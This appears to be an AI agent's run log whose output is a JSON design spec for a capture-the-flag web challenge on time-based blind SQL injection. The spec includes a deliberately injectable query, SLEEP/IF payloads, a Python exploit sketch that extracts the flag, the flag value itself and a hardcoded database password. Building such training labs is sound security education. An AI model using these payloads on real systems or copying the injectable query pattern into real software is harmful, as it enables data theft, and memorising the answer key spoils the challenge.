$ /opt/homebrew/bin/uvx --from hermes-agent hermes -p default chat -Q --yolo -q <prompt>
cwd: /Users/me7eorite/Desktop/ctf-skills
timeout: 600s
env:
  (none)

--- stderr ---

session_id: 20260617_234203_74939a
--- end stderr ---

--- stdout ---
```json
{
  "event": {
    "name": "SQL injection bypass test",
    "theme": "web application security",
    "audience": "intermediate CTF players",
    "flag_format": "flag{...}",
    "categories": ["web"],
    "total_challenges": 4,
    "difficulty_distribution": {
      "easy": 2,
      "medium": 2
    }
  },
  "challenges": [
    {
      "id": "web-0003",
      "title": "Time Leaks",
      "category": "web",
      "difficulty": "medium",
      "points": 200,
      "port": 9003,
      "primary_technique": "Blind SQL injection via time delays",
      "learning_objective": "Reproduce Blind SQL injection via time delays on a web target derived from research run 1.",
      "estimated_solve_time": "30-45 minutes",
      "deployment": "docker",
      "authoring_effort": "medium",
      "player_prompt": "A product search portal for a small electronics company. The admin mentioned something about 'timing attacks' being theoretical... find the flag in the database.",
      "intended_path": [
        "Discover the search parameter at /search?q= is injectable",
        "Test with basic payloads: ' OR '1'='1 returns same result, confirming injection but no data visibility",
        "Attempt UNION-based injection and observe no column reflection occurs",
        "Attempt error-based injection and observe generic error handling suppresses messages",
        "Test time-based payloads: ' OR SLEEP(3)-- causes 3+ second delay",
        "Develop conditional time-based payload: ' OR IF(SUBSTRING((SELECT flag FROM secret_flags LIMIT 1),1,1)='f',SLEEP(2),0)--",
        "Automate extraction using Python script or sqlmap with time-based technique",
        "Extract full flag character by character"
      ],
      "artifacts": [
        "Docker container running MySQL backend with PHP/Python web application",
        "Web application accessible on port 9003",
        "Database seeded with products table and secret_flags table",
        "No source code provided (black-box)"
      ],
      "flag_plan": {
        "format": "flag{...}",
        "location": "secret_flags table, flag column, single row",
        "generation_rule": "static flag for challenge consistency",
        "value": "flag{t1m3_b4s3d_1nj3ct10n_m4st3r}"
      },
      "docker_config": {
        "image_name": "time-leaks",
        "container_name": "time-leaks",
        "base_image": "php:8.2-apache",
        "internal_port": 8080,
        "host_port": 9003,
        "runtime_user": "www-data",
        "runtime_directory": "/var/www/html",
        "writable_paths": [
          "/var/www/html/uploads"
        ],
        "capabilities": "none",
        "privileged": false,
        "volumes": [],
        "database": "MySQL 8.0 installed in same container",
        "flag_injection": "environment.FLAG via docker-compose.yml, read by init script to seed database"
      },
      "compose_spec": {
        "services": {
          "time-leaks": {
            "image": "time-leaks",
            "container_name": "time-leaks",
            "ports": [
              "9003:8080"
            ],
            "environment": {
              "FLAG": "${FLAG}"
            },
            "build": "."
          }
        }
      },
      "dockerfile_snippet": "FROM php:8.2-apache\nRUN apt-get update && apt-get install -y default-mysql-server default-mysql-client && rm -rf /var/lib/apt/lists/*\nCOPY src/ /var/www/html/\nCOPY _files/init.sh /docker-entrypoint.sh\nRUN chown -R www-data:www-data /var/www/html && chmod +x /docker-entrypoint.sh\nRUN service mysql start && mysql -u root -e \"CREATE DATABASE appdb; CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'appass123'; GRANT ALL ON appdb.* TO 'appuser'@'localhost';\" && mysql -u root appdb < _files/schema.sql\nUSER www-data\nEXPOSE 8080\nENTRYPOINT [\"/docker-entrypoint.sh\"]",
      "validation": {
        "reference_solve": "exploit.py",
        "solve_command": "python3 exploit.py --target http://localhost:9003 --time-threshold 2",
        "expected_result": "Flag extracted via time-based blind SQLi and printed to stdout",
        "regression_checks": [
          "Verify SLEEP(2) payload causes measurable delay (2.0-2.5 seconds)",
          "Verify UNION-based injection returns no useful data",
          "Verify error messages are suppressed",
          "Verify flag exists in secret_flags table after container initialization"
        ]
      },
      "hints": [
        "The search function might not be telling you everything about what's happening server-side.",
        "What if the database is doing something you can't see, but takes time to do?",
        "MySQL has functions like SLEEP() and IF() that can help you extract data one character at a time."
      ],
      "anti_frustration_checks": [
        "Database name 'appdb' leaked in HTML comment for easier targeting",
        "Table 'products' visible in search results implies at least one table exists",
        "Characters limited to alphanumeric, underscore, and curly braces in flag to avoid encoding issues",
        "Network latency simulated consistent - test environment runs on localhost",
        "sqlmap works with --technique=T and --dbms=mysql flags"
      ],
      "application_design": {
        "routes": [
          {
            "path": "/",
            "method": "GET",
            "description": "Homepage with search form and link to /search"
          },
          {
            "path": "/search",
            "method": "GET",
            "description": "Product search with vulnerable q parameter",
            "vulnerable_param": "q"
          },
          {
            "path": "/health",
            "method": "GET",
            "description": "Health check endpoint returning 200 OK"
          }
        ],
        "vulnerable_query": "SELECT id, name, description, price FROM products WHERE name LIKE '%{user_input}%'",
        "injection_context": "User input directly concatenated into WHERE clause",
        "filter_bypass": "No keyword filtering - direct injection possible, but output channel blocked",
        "output_channel": "blind",
        "blocking_mechanisms": [
          "No database errors displayed to user",
          "Query results only show products table columns",
          "No stacked queries supported by PHP mysqli",
          "Application returns generic 'found X products' message regardless of query structure"
        ]
      },
      "database_schema": {
        "database": "appdb",
        "tables": {
          "products": {
            "columns": ["id INT PRIMARY KEY", "name VARCHAR(100)", "description TEXT", "price DECIMAL(10,2)"],
            "rows": 15,
            "purpose": "Decoy table visible through normal search"
          },
          "secret_flags": {
            "columns": ["id INT PRIMARY KEY", "flag VARCHAR(100)"],
            "rows": 1,
            "purpose": "Target table containing flag"
          }
        },
        "user": "appuser",
        "password": "appass123"
      },
      "exploit_sketch": "import requests\nimport time\nimport string\n\ndef extract_flag(target):\n    flag = ''\n    charset = string.ascii_lowercase + string.digits + '_{}'\n    \n    for pos in range(1, 50):\n        for char in charset:\n            payload = f\"' OR IF(SUBSTRING((SELECT flag FROM secret_flags LIMIT 1),{pos},1)='{char}',SLEEP(2),0)-- -\"\n            start = time.time()\n            requests.get(f\"{target}/search\", params={'q': payload})\n            elapsed = time.time() - start\n            \n            if elapsed >= 1.8:\n                flag += char\n                print(f\"Found: {flag}\")\n                break\n        else:\n            break\n    \n    return flag",
      "risks": [
        "Players may give up if timing is too noisy - ensure stable environment",
        "sqlmap may timeout if --time-sec not adjusted",
        "Flag length estimation may frustrate - provide charset hint in description"
      ],
      "delivery_format": {
        "exp_package": "工具/js-web-time_leaksexp.zip",
        "docker_config_package": "题库资源/deploy/js-web-time_leaks.zip",
        "attachment_package": "not required",
        "pdf_report": "题库资源/deploy/report/js-web-time_leaks.pdf",
        "docker_tar": "虚拟机资源/docker-tar/time_leaks[9003]-20260617.tar",
        "overview_row": "web-0003, Time Leaks, A product search portal for a small electronics company. The admin mentioned something about 'timing attacks' being theoretical... find the flag in the database., web, medium, Blind SQL injection via time delays, 200, flag{...}, active",
        "image_inventory_row": "Time Leaks, time_leaks:latest, 9003, php:8.2-apache, apache2-foreground"
      }
    }
  ]
}
```
--- end stdout ---
